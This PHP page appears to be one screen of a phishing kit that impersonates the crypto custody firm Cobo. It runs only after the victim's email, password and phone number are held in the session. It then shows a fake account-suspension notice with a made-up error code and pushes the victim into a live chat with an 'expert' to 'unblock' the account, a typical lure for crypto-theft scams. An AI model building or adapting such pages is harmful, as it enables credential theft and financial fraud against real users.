<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Cobo | Your trusted partner for custody and wallet infrastructure solutions';
        include_once './includes/meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container-fluid'>
            <div class="row justify-content-center">
                <div class='col-sm-4 rounded-4 p25 my30 bg-white' style="border: 1px #edf2f9 solid">
                    <h1 class='h6 mobile_web_font fw-bold pt10 text-center text-danger'>Important Message !</h1>
                    <div class="my20">
                        Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.
                    </div>
                    <div class='fs18 pt25 text-center fw-semibold my30'>Error CODE: EBRX1:6X76D</div>
                    <div class="d-grid my30">
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-success btn-primary-2 py10 btn-lg" >Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>